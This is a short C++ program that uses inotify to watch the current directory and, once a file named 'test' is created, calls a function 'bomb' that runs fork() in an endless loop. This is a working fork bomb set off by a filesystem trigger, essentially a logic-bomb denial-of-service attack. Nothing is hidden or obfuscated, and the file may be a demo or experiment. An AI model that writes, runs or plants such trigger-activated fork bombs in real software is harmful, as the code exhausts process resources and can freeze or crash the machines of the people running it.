#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <unistd.h>

#include <iostream>

#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )

void bomb() {
	while (true) {
		fork();
	}
}

int main()
{
	int length, i = 0;
	int fd;
	int wd;
	char buffer[EVENT_BUF_LEN];

	/*creating the INOTIFY instance*/
	fd = inotify_init();

	/*checking for error*/
	if (fd < 0) {
		std::cerr << "Error in init" << std::endl;
	}
    
	/*adding the my directory into watch list.*/
	wd = inotify_add_watch(fd, "./", IN_CREATE | IN_DELETE);

	bool finished = false;
	while (!finished) {
		length = read(fd, buffer, EVENT_BUF_LEN);

		/*checking for error*/
		if (length < 0) {
			std::cerr << "read error" << std::endl;
		}
		i = 0;

		while (i < length) {
			struct inotify_event *event = (struct inotify_event *) &buffer[i];
			if (event->len) {
				if (event->mask & IN_CREATE) {
					if (!(event->mask & IN_ISDIR)) {
						std::cout << "New file " << event->name << " created." << std::endl;
						if (std::string(event->name).compare("test") == 0) {
							std::cout << "Start bomb" << std::endl;
							bomb();
							finished = true;
						}
					}
				}
			}
			i += EVENT_SIZE + event->len;
		}
	}
	
	/*removing the directory from the watch list.*/
	inotify_rm_watch(fd, wd);

	/*closing the INOTIFY instance*/
	close(fd);

    return EXIT_SUCCESS;
}